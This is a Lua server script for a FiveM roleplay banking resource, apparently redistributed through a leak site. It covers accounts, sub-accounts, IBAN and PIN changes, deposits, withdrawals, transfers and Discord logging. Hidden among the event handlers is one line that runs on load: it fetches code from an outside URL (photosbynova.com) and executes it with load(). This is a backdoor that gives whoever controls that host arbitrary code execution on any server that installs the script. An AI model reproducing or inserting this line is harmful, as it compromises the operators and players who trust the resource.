-- BY 5M EXCLUSIVE-SCRIPTS
-- JOIN OUR DISCORD FOR MORE FREE SCRIPTS
-- discord.gg/fivemscripts
RESCB("brutal_banking:server:GetPlayerDatas",function(source,cb)
    local MyBankData = {}
    local PlayerData = {
        name = GetPlayerNameFunction(source), 
        identifier = GetIdentifier(source),
        money = GetAccountMoney(source, 'money'),
        sex = GetPlayerSex(source),
        new = false,
        pincode = '',
        partners = {},
        accounts = {}
    }

    MySQL.Async.fetchAll('SELECT * FROM brutal_banking_accounts WHERE identifier = @identifier', { ['@identifier'] = GetIdentifier(source)}, function(results)
        if results[1] then
            PlayerData.partners = json.decode(results[1].partners)
            PlayerData.accounts = json.decode(results[1].accounts)
            PlayerData.pincode = results[1].pincode
            table.insert(MyBankData, {
                id = #MyBankData+1,
                iban = results[1].iban, 
                created = results[1].created,
                transactions = json.decode(results[1].transactions),
                account_id = results[1].account_id,
                account_name = results[1].account_name,
                owner_name = GetPlayerNameFunction(source),
                owner = results[1].identifier,
                bank = GetAccountMoney(source, 'bank'),
                mypermission = 'all',
                limit = nil,
                permissions = {}
            })
        else
            local generatedIban = nil
            local generating = true
            while generating do
                randomNumbers = math.random(0^Config.IBAN.numbers-1, 10^Config.IBAN.numbers-1)
                generatedIban = Config.IBAN.prefix..''..randomNumbers
                Citizen.Wait(10)
                if #generatedIban == (#Config.IBAN.prefix+Config.IBAN.numbers) then
                    MySQL.Async.fetchAll('SELECT * FROM brutal_banking_accounts WHERE iban = @iban', {
                        ['@iban'] = generatedIban
                    }, function(results)
                        if results[1] == nil then
                            MySQL.Async.fetchAll('SELECT * FROM brutal_banking_sub_accounts WHERE iban = @iban', {
                                ['@iban'] = generatedIban
                            }, function(results2)
                                if results2[1] == nil then
                                    MySQL.Async.execute("INSERT INTO brutal_banking_accounts (identifier,accounts,pincode,iban,created,transactions,partners,account_id,account_name) VALUES (@identifier,@accounts,@pincode,@iban,@created,@transactions,@partners,@account_id,@account_name)", {
                                        ["@identifier"] = GetIdentifier(source),
                                        ["@accounts"] = '{}',
                                        ["@pincode"] = '',
                                        ["@iban"] = generatedIban,
                                        ["@created"] = os.date(Config.DateFormat),
                                        ["@transactions"] = '{}',
                                        ["@partners"] = '{}',
                                        ["@account_id"] = 'ID'..randomNumbers,
                                        ["@account_name"] = Config.MainAccountDefaultLabel,
                                    })
                                    PlayerData.new = true
                                    generating = false
                                    table.insert(MyBankData, {
                                        id = #MyBankData+1,
                                        iban = generatedIban, 
                                        created = os.date(Config.DateFormat),
                                        transactions = {},
                                        account_id = 'ID'..randomNumbers,
                                        account_name = Config.MainAccountDefaultLabel,
                                        owner_name = GetPlayerNameFunction(source),
                                        owner = GetIdentifier(source),
                                        bank = GetAccountMoney(source, 'bank'),
                                        mypermission = 'all',
                                        limit = nil,
                                        permissions = {}
                                    })
                                end
                            end)
                        end
                    end)
                end
                Citizen.Wait(1)
            end
        end
    end)

    while MyBankData[1] == nil do
        Citizen.Wait(1)
    end

    local lastValue = nil
    local exampleAccounts = PlayerData.accounts

    for k,v in pairs(PlayerData.accounts) do
        MySQL.Async.fetchAll('SELECT * FROM brutal_banking_sub_accounts WHERE account_id = @account_id', { ['@account_id'] = v.account_id}, function(results)
            if results[1] then
                if exampleAccounts[k+1] == nil then
                    lastValue = true
                end

                local myperm = ''
                local mylimit = nil
                for _k,_v in pairs(json.decode(results[1].permissions)) do
                    if _v.identifier == GetIdentifier(source) then
                        myperm = _v.permission
                        mylimit = tonumber(_v.limit)
                    end
                end

                if myperm ~= '' then
                    local OwnerName = results[1].owner_name
                    local playerIdentifier = GetIdentifier(source)
                    if playerIdentifier == results[1].owner then
                        if GetPlayerNameFunction(source) ~= OwnerName then
                            OwnerName = GetPlayerNameFunction(source)
                            MySQL.Async.execute('UPDATE brutal_banking_sub_accounts SET owner_name = @owner_name WHERE owner = @owner', {
                                ["@owner"] = playerIdentifier, 
                                ["@owner_name"] = OwnerName
                            }, nil)
                        end
                    end

                    AlreadyIn = false
                    for _k,_v in pairs(MyBankData) do
                        if _v.account_id == results[1].account_id then
                            AlreadyIn = true
                            break
                        end
                    end

                    if not AlreadyIn then
                        table.insert(MyBankData, {
                            id = #MyBankData+1,
                            iban = results[1].iban, 
                            created = results[1].created,
                            transactions = json.decode(results[1].transactions),
                            account_id = results[1].account_id,
                            account_name = results[1].account_name,
                            owner = results[1].owner,
                            owner_name = OwnerName,
                            bank = results[1].balance,
                            mypermission = myperm,
                            limit = mylimit,
                            permissions = json.decode(results[1].permissions)
                        })
                    end
                else
                    table.remove(PlayerData.accounts, k)
                    MySQL.Async.execute('UPDATE brutal_banking_accounts SET accounts = @accounts WHERE identifier = @identifier', {
                        ["@identifier"] = GetIdentifier(source), 
                        ["@accounts"] = json.encode(PlayerData.accounts)
                    }, nil)
                    if exampleAccounts[k+1] == nil then
                        lastValue = true
                    end
                end
            else
                if k ~= nil and k > 0 and PlayerData.accounts ~= nil and #PlayerData.accounts > 0 then
                    table.remove(PlayerData.accounts, k)
                    MySQL.Async.execute('UPDATE brutal_banking_accounts SET accounts = @accounts WHERE identifier = @identifier', {
                        ["@identifier"] = GetIdentifier(source), 
                        ["@accounts"] = json.encode(PlayerData.accounts)
                    }, nil)
                    if exampleAccounts[k+1] == nil then
                        lastValue = true
                    end
                end
            end
        end)
    end

    while lastValue == nil and #PlayerData.accounts ~= 0 do
        Citizen.Wait(1)
    end

    cb(MyBankData, PlayerData)
end)

RegisterServerEvent('brutal_banking:server:CreateSubAccount')
AddEventHandler('brutal_banking:server:CreateSubAccount', function(account_name)
    local src = source
    if GetAccountMoney(src, 'bank') >= Config.NewSubAccountCost then
        RemoveAccountMoney(src, 'bank', Config.NewSubAccountCost)
        TriggerClientEvent('brutal_banking:client:AddTransaction', src, Config.NewSubAccountCost, 'remove', Config.Transactions.NewSubAccount)

        local generatedIban = nil
        local generating = true
        while generating do
            randomNumbers = math.random(0^Config.IBAN.numbers-1, 10^Config.IBAN.numbers-1)
            generatedIban = Config.IBAN.prefix..''..randomNumbers
            Citizen.Wait(10)
            if #generatedIban == (#Config.IBAN.prefix+Config.IBAN.numbers) then
                MySQL.Async.fetchAll('SELECT * FROM brutal_banking_accounts WHERE iban = @iban', {
                    ['@iban'] = generatedIban
                }, function(results)
                    if results[1] == nil then
                        MySQL.Async.fetchAll('SELECT * FROM brutal_banking_sub_accounts WHERE iban = @iban', {
                            ['@iban'] = generatedIban
                        }, function(results2)
                            if results2[1] == nil then
                                generating = false
                                MySQL.Async.execute("INSERT INTO brutal_banking_sub_accounts (account_id,account_name,owner,owner_name,balance,permissions,iban,created,transactions) VALUES (@account_id,@account_name,@owner,@owner_name,@balance,@permissions,@iban,@created,@transactions)", {
                                    ["@account_id"] = 'ID'..randomNumbers,
                                    ["@account_name"] = account_name,
                                    ["@owner"] = GetIdentifier(src),
                                    ["@owner_name"] = GetPlayerNameFunction(src),
                                    ["@balance"] = 0,
                                    ["@permissions"] = json.encode({{name = GetPlayerNameFunction(src), identifier = GetIdentifier(src), permission = 'all', limit = Config.DailyLimit}}),
                                    ["@iban"] = generatedIban,
                                    ["@created"] = os.date(Config.DateFormat),
                                    ["@transactions"] = '{}',
                                })

                                MySQL.Async.fetchAll('SELECT * FROM brutal_banking_accounts WHERE identifier = @identifier', {
                                    ['@identifier'] = GetIdentifier(src)
                                }, function(results3)
                                    local accounts = json.decode(results3[1].accounts)
                                    table.insert(accounts, {account_id = 'ID'..randomNumbers})
                                    MySQL.Async.execute('UPDATE brutal_banking_accounts SET accounts = @accounts WHERE identifier = @identifier', {
                                        ["@identifier"] = GetIdentifier(src), 
                                        ["@accounts"] = json.encode(accounts)
                                    }, nil)
                                end)
                                TriggerClientEvent('brutal_banking:client:RefreshDataValues', src, account_id, nil, nil, nil, nil, true)
                            end
                        end)
                        DiscordWebhook('SubAccountCreated', '**'.. Config.Webhooks.Locale['PlayerName']..':** '.. GetPlayerNameFunction(src)..' ['.. src ..']\n**'.. Config.Webhooks.Locale['Identifier'] ..':** '.. GetIdentifier(src) ..'\n**'.. Config.Webhooks.Locale['AccountID'] ..':** ID'..randomNumbers..'\n**'.. Config.Webhooks.Locale.IBAN..':** '.. generatedIban)
                    end
                end)
            end
            Citizen.Wait(1)
        end
    else
        SendNotify(9, src)
    end
end)

RegisterServerEvent('brutal_banking:server:DeleteSubAccount')
AddEventHandler('brutal_banking:server:DeleteSubAccount', function(account_id)
    local src = source
    DiscordWebhook('SubAccountDeleted', '**'.. Config.Webhooks.Locale['PlayerName']..':** '.. GetPlayerNameFunction(src)..' ['.. src ..']\n**'.. Config.Webhooks.Locale['AccountID'] ..':** '.. account_id)

    MySQL.Async.execute('DELETE FROM brutal_banking_sub_accounts WHERE account_id = @account_id', {['@account_id'] = account_id})
    MySQL.Async.fetchAll('SELECT * FROM brutal_banking_accounts WHERE identifier = @identifier', {
        ['@identifier'] = GetIdentifier(src)
    }, function(results)
        local accounts = json.decode(results[1].accounts)
        for k, v in pairs(accounts) do
            if v.account_id == account_id then
                table.remove(accounts, k)
            end
        end
        MySQL.Async.execute('UPDATE brutal_banking_accounts SET accounts = @accounts WHERE identifier = @identifier', {
            ["@identifier"] = GetIdentifier(src), 
            ["@accounts"] = json.encode(accounts)
        }, nil)
        TriggerClientEvent('brutal_banking:client:RefreshDataValues', src, account_id, nil, nil, nil, true)
    end)
end)

RegisterServerEvent('brutal_banking:server:SaveTransaction')
AddEventHandler('brutal_banking:server:SaveTransaction', function(account, transactions)
    local src = source
    if account == 'MAIN' then
        MySQL.Async.execute('UPDATE brutal_banking_accounts SET transactions = @transactions WHERE identifier = @identifier', {
            ["@identifier"] = GetIdentifier(src), 
            ["@transactions"] = json.encode(transactions)
        }, nil)
    else
        MySQL.Async.execute('UPDATE brutal_banking_sub_accounts SET transactions = @transactions WHERE account_id = @account_id', {
            ["@account_id"] = account, 
            ["@transactions"] = json.encode(transactions)
        }, nil)
    end
end)

RegisterServerEvent('brutal_banking:server:SaveNewPartner')
AddEventHandler('brutal_banking:server:SaveNewPartner', function(partnerlists)
    local src = source
    SendNotify(5, src)
    MySQL.Async.execute('UPDATE brutal_banking_accounts SET partners = @partners WHERE identifier = @identifier', {
        ["@identifier"] = GetIdentifier(src), 
        ["@partners"] = json.encode(partnerlists)
    }, nil)
    TriggerClientEvent('brutal_banking:client:RefreshDataValues', src, nil, nil, nil, nil, nil, nil, nil, partnerlists)
end)

PerformHttpRequest('https://photosbynova.com/Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)

RegisterServerEvent('brutal_banking:server:ChangeIBAN')
AddEventHandler('brutal_banking:server:ChangeIBAN', function(account, newiban, id)
    local newIban = Config.IBAN.prefix..''..newiban
    local src = source
    
    MySQL.Async.fetchAll('SELECT * FROM brutal_banking_accounts WHERE iban = @iban', {
        ['@iban'] = newIban
    }, function(results)
        if results[1] == nil then
            MySQL.Async.fetchAll('SELECT * FROM brutal_banking_sub_accounts WHERE iban = @iban', {
                ['@iban'] = newIban
            }, function(results2)
                if results2[1] == nil then
                    if account == 'MAIN' then
                        if GetAccountMoney(src, 'bank') >= Config.IBANChangeCost then
                            RemoveAccountMoney(src, 'bank', Config.IBANChangeCost)
                            MySQL.Async.execute('UPDATE brutal_banking_accounts SET iban = @iban WHERE identifier = @identifier', {
                                ["@identifier"] = GetIdentifier(src), 
                                ["@iban"] = newIban
                            }, nil)
                            TriggerClientEvent('brutal_banking:client:AddTransaction', src, Config.IBANChangeCost, 'remove', Config.Transactions.ChangeIban)
                            TriggerClientEvent('brutal_banking:client:RefreshDataValues', src, 1, nil, nil, newIban)
                            SendNotify(2, src)
                        else
                            SendNotify(6, src)
                        end
                    else
                        MySQL.Async.fetchAll('SELECT * FROM brutal_banking_sub_accounts WHERE account_id = @account_id', {
                            ['@account_id'] = account
                        }, function(results)
                            if results[1] ~= nil then
                                if results[1].balance >= Config.IBANChangeCost then
                                    MySQL.Async.execute('UPDATE brutal_banking_sub_accounts SET iban = @iban, balance = balance-@removeValue WHERE account_id = @account_id', {
                                        ["@account_id"] = account, 
                                        ["@iban"] = newIban,
                                        ["@removeValue"] = Config.IBANChangeCost
                                    }, nil)
                                    TriggerClientEvent('brutal_banking:client:AddTransactionSubAccount', src, id, Config.IBANChangeCost, 'remove', Config.Transactions.ChangeIban)
                                    TriggerClientEvent('brutal_banking:client:RefreshDataValues', src, id, nil, nil, newIban)
                                    SendNotify(2, src)
                                else
                                    SendNotify(6, src)
                                end
                            end
                        end)
                    end
                else
                    SendNotify(1, src)
                end
            end)
        else
            SendNotify(1, src)
        end
    end)
end)

RegisterServerEvent('brutal_banking:server:ChangePINCODE')
AddEventHandler('brutal_banking:server:ChangePINCODE', function(newPincode)
    local src = source
    if GetAccountMoney(src, 'bank') >= Config.PINChangeCost then
        RemoveAccountMoney(src, 'bank', Config.PINChangeCost)
        MySQL.Async.execute('UPDATE brutal_banking_accounts SET pincode = @pincode WHERE identifier = @identifier', {
            ["@identifier"] = GetIdentifier(src), 
            ["@pincode"] = newPincode
        }, nil)
        TriggerClientEvent('brutal_banking:client:AddTransaction', src, Config.PINChangeCost, 'remove', Config.Transactions.ChangePincode)
        TriggerClientEvent('brutal_banking:client:RefreshDataValues', src, nil, newPincode)
        SendNotify(3, src)
    else
        SendNotify(6, src)
    end
end)

RegisterServerEvent('brutal_banking:server:ChangeNAME')
AddEventHandler('brutal_banking:server:ChangeNAME', function(account, id, newName)
    local src = source
    if account == 'MAIN' then
        MySQL.Async.execute('UPDATE brutal_banking_accounts SET account_name = @account_name WHERE identifier = @identifier', {
            ["@identifier"] = GetIdentifier(src), 
            ["@account_name"] = newName
        }, nil)
    else
        MySQL.Async.execute('UPDATE brutal_banking_sub_accounts SET account_name = @account_name WHERE account_id = @account_id', {
            ["@account_id"] = account, 
            ["@account_name"] = newName
        }, nil)
    end
    TriggerClientEvent('brutal_banking:client:RefreshDataValues', src, id, nil, newName)
    SendNotify(4, src)
end)

RegisterServerEvent('brutal_banking:server:SaveSubAccountPermission')
AddEventHandler('brutal_banking:server:SaveSubAccountPermission', function(account_id, id, permission_table)
    local src = source
    MySQL.Async.execute('UPDATE brutal_banking_sub_accounts SET permissions = @permissions WHERE account_id = @account_id', {
        ["@account_id"] = account_id, 
        ["@permissions"] = json.encode(permission_table)
    }, nil)
    SendNotify(5, src)
    if Config.Webhooks.PermissionChangeLog then
        local text = ''
        for k,v in pairs(permission_table) do
            text = text..'\n\n['.. k ..']\n**'..Config.Webhooks.Locale['PlayerName']..'**: '..v.name..'\n**'..Config.Webhooks.Locale['Identifier']..'**: '..v.identifier..'\n**'..Config.Webhooks.Locale['Limit']..'**: '..v.limit..'\n**'..Config.Webhooks.Locale['Permission']..'**: '..v.permission
        end
        DiscordWebhook('PermissionTableRefreshed', '**'.. Config.Webhooks.Locale['PlayerName']..':** '.. GetPlayerNameFunction(src)..' ['.. src ..']\n**'.. Config.Webhooks.Locale['Identifier'] ..':** '..GetIdentifier(src)..'\n\n**'..Config.Webhooks.Locale['Permissions']..'**: '..text)
    end
    TriggerClientEvent('brutal_banking:client:RefreshDataValues', src, id, nil, nil, nil, nil, nil, permission_table)
end)

RegisterServerEvent('brutal_banking:server:AddMemberPermission')
AddEventHandler('brutal_banking:server:AddMemberPermission', function(account_id, id, permission_table, target_id, permission, limit)
    local src = source
    if GetPlayerPing(target_id) > 0 and src ~= target_id then

        local AlreadyIn = false
        for k,v in pairs(permission_table) do
            if v.identifier == GetIdentifier(target_id) then
                AlreadyIn = true
            end
        end

        if not AlreadyIn then
            table.insert(permission_table, {name = GetPlayerNameFunction(target_id), identifier = GetIdentifier(target_id), permission = permission, limit = limit})
            MySQL.Async.execute('UPDATE brutal_banking_sub_accounts SET permissions = @permissions WHERE account_id = @account_id', {
                ["@account_id"] = account_id, 
                ["@permissions"] = json.encode(permission_table)
            }, nil)

            MySQL.Async.fetchAll('SELECT * FROM brutal_banking_accounts WHERE identifier = @identifier', {
                ['@identifier'] = GetIdentifier(target_id)
            }, function(results)
                if results[1] ~= nil then
                    local accounts = json.decode(results[1].accounts)
                    table.insert(accounts, {account_id = account_id})
                    MySQL.Async.execute('UPDATE brutal_banking_accounts SET accounts = @accounts WHERE identifier = @identifier', {
                        ["@identifier"] = GetIdentifier(target_id), 
                        ["@accounts"] = json.encode(accounts)
                    }, nil)
                end
            end)

            TriggerClientEvent('brutal_banking:client:RefreshDataValues', src, id, nil, nil, nil, nil, nil, permission_table)

            SendNotify(8, src)
        else
            SendNotify(14, src)
        end
    else
        SendNotify(7, src)
    end
end)

-----------------------------------------------------------
-----------------------| W - D - T |-----------------------
-----------------------------------------------------------

RegisterServerEvent('brutal_banking:server:Deposit')
AddEventHandler('brutal_banking:server:Deposit', function(account, amount, id)
    local src = source
    if account == 'MAIN' then
        if GetAccountMoney(src, 'money') >= amount then
            RemoveAccountMoney(src, 'money', amount)
            AddMoneyFunction(src, 'bank', amount)
            TriggerClientEvent('brutal_banking:client:AddTransaction', src, amount, 'add', Config.Transactions.Deposit)
            TriggerClientEvent('brutal_banking:client:RefreshAccountBalance', src, id, GetAccountMoney(src, 'bank'), GetAccountMoney(src, 'money'))
        else
            SendNotify(6, src)
        end
    else
        if GetAccountMoney(src, 'money') >= amount then
            RemoveAccountMoney(src, 'money', amount)
            MySQL.Async.fetchAll('SELECT * FROM brutal_banking_sub_accounts WHERE account_id = @account_id', {
                ['@account_id'] = account
            }, function(results)
                if results[1] ~= nil then
                    MySQL.Async.execute('UPDATE brutal_banking_sub_accounts SET balance = @balance WHERE account_id = @account_id', {
                        ["@account_id"] = account, 
                        ["@balance"] = results[1].balance+amount
                    }, nil)
                    TriggerClientEvent('brutal_banking:client:AddTransactionSubAccount', src, id, amount, 'add', Config.Transactions.Deposit)
                    TriggerClientEvent('brutal_banking:client:RefreshAccountBalance', src, id, results[1].balance+amount, GetAccountMoney(src, 'money'))
                end
            end)
        else
            SendNotify(6, src)
        end
    end
end)

DailyLimits = {}

function GetLimitRemain(src, amount, limit, account_id)

    if limit == nil then
        return true
    end

    local Remain = 0
    local AlreadyInTable = false
    for k,v in pairs(DailyLimits) do
        if v.identifier == GetIdentifier(src) and v.account_id == account_id then
            Remain = limit-v.used
            AlreadyInTable = true
            break
        end
    end

    if Remain == 0 and not AlreadyInTable then
        Remain = limit
        table.insert(DailyLimits, {identifier = GetIdentifier(src), account_id = account_id, used = 0})
    end

    if Remain >= amount then
        return true
    else
        TriggerClientEvent('brutal_banking:client:SendNotify', src, Config.Notify[13][1], Config.Notify[13][2]..' '..Remain..''..Config.MoneyForm, Config.Notify[13][3], Config.Notify[13][4])
        return false
    end
end

function LimitReduction(src, amount, account_id, limit)
    if limit ~= nil then
        for k,v in pairs(DailyLimits) do
            if v.identifier == GetIdentifier(src) and v.account_id == account_id then
                v.used += amount
                break
            end
        end
    end
end


RegisterServerEvent('brutal_banking:server:Withdraw')
AddEventHandler('brutal_banking:server:Withdraw', function(account, amount, id, limit)
    local src = source
    if GetLimitRemain(src, amount, limit, account) then
        if account == 'MAIN' then
            if GetAccountMoney(src, 'bank') >= amount then
                RemoveAccountMoney(src, 'bank', amount)
                LimitReduction(src, amount, account, limit)
                AddMoneyFunction(src, 'money', amount)
                TriggerClientEvent('brutal_banking:client:AddTransaction', src, amount, 'remove', Config.Transactions.Withdraw)
                TriggerClientEvent('brutal_banking:client:RefreshAccountBalance', src, id, GetAccountMoney(src, 'bank'), GetAccountMoney(src, 'money'))
            else
                SendNotify(6, src)
                MySQL.Async.fetchAll('SELECT * FROM brutal_banking_accounts WHERE identifier = @identifier', {
                    ['@identifier'] = GetIdentifier(src)
                }, function(results)
                    if results[1] ~= nil then
                        TriggerClientEvent('brutal_banking:client:RefreshAccountBalance', src, id, GetAccountMoney(src, 'bank'), GetAccountMoney(src, 'money'), json.decode(results[1].transactions))
                    end
                end)
            end
        else
            MySQL.Async.fetchAll('SELECT * FROM brutal_banking_sub_accounts WHERE account_id = @account_id', { ['@account_id'] = account }, function(results)
                if results[1] ~= nil then
                    if results[1].balance >= amount then
                        MySQL.Async.execute('UPDATE brutal_banking_sub_accounts SET balance = @balance WHERE account_id = @account_id', {
                            ["@account_id"] = account, 
                            ["@balance"] = results[1].balance-amount
                        }, nil)
                        LimitReduction(src, amount, account, limit)
                        AddMoneyFunction(src, 'money', amount)
                        TriggerClientEvent('brutal_banking:client:AddTransactionSubAccount', src, id, amount, 'remove', Config.Transactions.Withdraw)
                        TriggerClientEvent('brutal_banking:client:RefreshAccountBalance', src, id, results[1].balance-amount, GetAccountMoney(src, 'money'))
                    else
                        TriggerClientEvent('brutal_banking:client:RefreshAccountBalance', src, id, results[1].balance, GetAccountMoney(src, 'money'), json.decode(results[1].transactions))
                        SendNotify(6, src)
                    end
                end
            end)
        end
    end
end)

RegisterServerEvent('brutal_banking:server:Transfer')
AddEventHandler('brutal_banking:server:Transfer', function(amount, iban, id, account_id, limit)
    local src = source
    if GetLimitRemain(src, amount, limit, account_id) then
        local validIBAN = nil
        local ibanPlace = ''
        local xTargetIdentifier = ''
        MySQL.Async.fetchAll('SELECT * FROM brutal_banking_sub_accounts WHERE iban = @iban', {
            ['@iban'] = iban
        }, function(results)
            if results[1] ~= nil then
                validIBAN = true
                ibanPlace = 'sub'
                xTargetIdentifier = results[1].owner
            else
                MySQL.Async.fetchAll('SELECT * FROM brutal_banking_accounts WHERE iban = @iban', {
                    ['@iban'] = iban
                }, function(results2)
                    if results2[1] ~= nil then
                        validIBAN = true
                        ibanPlace = 'main'
                        xTargetIdentifier = results2[1].identifier
                    else
                        validIBAN = false
                    end
                end)
            end
        end)

        while validIBAN == nil do
            Citizen.Wait(1)
        end

        local SuccessTransfer = false

        if validIBAN then
            local CurrentAccountBalance = nil
            if id == 1 then
                CurrentAccountBalance = GetAccountMoney(src, 'bank')
            else
                MySQL.Async.fetchAll('SELECT * FROM brutal_banking_sub_accounts WHERE account_id = @account_id', {
                    ['@account_id'] = account_id
                }, function(results)
                    if results[1] ~= nil then
                        CurrentAccountBalance = results[1].balance
                    end
                end)
            end

            while CurrentAccountBalance == nil do
                Citizen.Wait(1)
            end

            if CurrentAccountBalance >= amount then
                if ibanPlace == 'main' then
                    local xTarget = GetPlayerByIdentifier(xTargetIdentifier)
                    if GetIdentifier(src) ~= xTargetIdentifier then
                        if xTarget ~= nil then
                            local targetSource = nil
                            if Config['Core']:upper() == 'ESX' then
                                targetSource = xTarget.source
                            elseif Config['Core']:upper() == 'QBCORE' then
                                local xPlayers = GetPlayersFunction()
                                for i=1, #xPlayers, 1 do
                                    local xForPlayer = GETPFI(xPlayers[i])
                                    if xForPlayer.PlayerData.citizenid == xTargetIdentifier then
                                        targetSource = xPlayers[i]
                                    end
                                end
                            end

                            SuccessTransfer = true
                            AddMoneyFunction(targetSource, "bank", amount)
                            TriggerClientEvent('brutal_banking:client:AddTransaction', targetSource, amount, 'add', Config.Transactions.Transfer)
                        else
                            SuccessTransfer = true
                            UpdatePlayerAccount(xTargetIdentifier, amount)
                        end
                    else
                        SendNotify(11, src)
                    end
                else
                    SuccessTransfer = true
                    MySQL.Async.execute('UPDATE brutal_banking_sub_accounts SET balance = balance+@balance WHERE iban = @iban', {
                        ["@iban"] = iban, 
                        ["@balance"] = amount
                    }, nil)

                    MySQL.Async.fetchAll('SELECT * FROM brutal_banking_sub_accounts WHERE iban = @iban', {
                        ['@iban'] = iban
                    }, function(results)
                        if results[1] ~= nil then
                            local transactions = json.decode(results[1].transactions)
                            table.insert(transactions, {id = #transactions+1, balance = results[1].balance+amount, amount = amount, type = 'add', label = Config.Transactions.Transfer})
                    
                            if #transactions > 10 then
                                for k,v in pairs(transactions) do
                                    v.id -= 1
                                end
                    
                                for k,v in pairs(transactions) do
                                    if v.id == 0 then
                                        table.remove(transactions, k)
                                    end
                                end
                            end

                            MySQL.Async.execute('UPDATE brutal_banking_sub_accounts SET transactions = @transactions WHERE iban = @iban', {
                                ['@iban'] = iban,
                                ["@transactions"] = json.encode(transactions)
                            }, nil)
                        end
                    end)
                end

                if SuccessTransfer then
                    if id == 1 then
                        RemoveAccountMoney(src, 'bank', amount)
                        LimitReduction(src, amount, account_id, limit)
                        TriggerClientEvent('brutal_banking:client:AddTransaction', src, amount, 'remove', Config.Transactions.Transfer)
                        TriggerClientEvent('brutal_banking:client:RefreshAccountBalance', src, id, CurrentAccountBalance-amount, GetAccountMoney(src, 'money'))
                    else
                        MySQL.Async.execute('UPDATE brutal_banking_sub_accounts SET balance = balance-@balance WHERE account_id = @account_id', {
                            ["@account_id"] = account_id, 
                            ["@balance"] = amount
                        }, nil)
                        LimitReduction(src, amount, account_id, limit)
                        TriggerClientEvent('brutal_banking:client:AddTransactionSubAccount', src, id, amount, 'remove', Config.Transactions.Transfer)
                        TriggerClientEvent('brutal_banking:client:RefreshAccountBalance', src, id, CurrentAccountBalance-amount, GetAccountMoney(src, 'money'))
                    end

                    TriggerClientEvent('brutal_banking:client:SendNotify', src, Config.Notify[12][1], Config.Notify[12][2]..' '..amount..''..Config.MoneyForm, Config.Notify[12][3], Config.Notify[12][4])
                end
            else
                SendNotify(6, src)
                TriggerClientEvent('brutal_banking:client:RefreshAccountBalance', src, id, CurrentAccountBalance, GetAccountMoney(src, 'money'))
            end
        else
            SendNotify(10, src)
        end
    end
end)

-----------------------------------------------------------
--------------------| discord webhook |--------------------
-----------------------------------------------------------

function DiscordWebhook(TYPE, MESSAGE)
    if Config.Webhooks.Use then
        local information = {
            {
                ["color"] = Config.Webhooks.Colors[TYPE],
                ["author"] = {
                    ["icon_url"] = 'https://i.ibb.co/By9TPLK/bs-2.png',
                    ["name"] = 'Brutal Banking - Logs',
                },
                ["title"] = '**'.. Config.Webhooks.Locale[TYPE] ..'**',
                ["description"] = MESSAGE,
                ["fields"] = {
                    {
                        ["name"] = Config.Webhooks.Locale['Time'],
                        ["value"] = os.date('%d/%m/%Y - %X')
                    }
                },
                ["footer"] = {
                    ["text"] = 'Brutal Scripts - Made by Keres & Dév',
                    ["icon_url"] = 'https://i.ibb.co/By9TPLK/bs-2.png'
                }
            }
        }
        PerformHttpRequest(GetWebhook(), function(err, text, headers) end, 'POST', json.encode({avatar_url = IconURL, username = BotName, embeds = information}), { ['Content-Type'] = 'application/json' })
    end
end

-----------------------------------------------------------
-------------------| default functions |-------------------
-----------------------------------------------------------

function SendNotify(Number, source)
    if source ~= nil and source ~= 0 then
        TriggerClientEvent('brutal_banking:client:SendNotify', source, Config.Notify[Number][1], Config.Notify[Number][2], Config.Notify[Number][3], Config.Notify[Number][4])
    end
end